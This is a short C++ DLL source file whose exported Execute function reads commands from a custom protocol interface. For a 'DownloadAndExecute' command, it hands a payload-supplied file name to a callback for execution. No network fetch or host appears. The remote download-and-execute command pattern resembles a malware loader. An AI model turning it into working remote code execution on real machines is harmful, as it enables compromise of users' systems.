// RomCode.cpp : Defines the exported functions for the DLL application.
//

#include <memory>

#include "Interfaces/CustomProtocolInterface.h"

std::function<bool(std::string)> _SetExecuteFunc;

extern "C"
{
    void __declspec(dllexport) __stdcall Execute()
    {
        if (CustomProtocolInterface::HasCommand())
        {
            CustomProtocolCommand *command = CustomProtocolInterface::GetCommand();
            switch (command->Command)
            {
                case CustomProtocolCommand::CommandCode::DownloadAndExecute:
                {
                    // Do download and execute
                    std::string filename = command->Payload.DownloadAndExecute.CodeName;
                    _SetExecuteFunc(filename);
                    CustomProtocolInterface::SubmitResponse(command);
                } break;
            }
        }
    }

    void __declspec(dllexport) __stdcall SetExecuteCallback(std::function<bool(std::string)> setExecuteFunc)
    {
        _SetExecuteFunc = setExecuteFunc;
    }
};
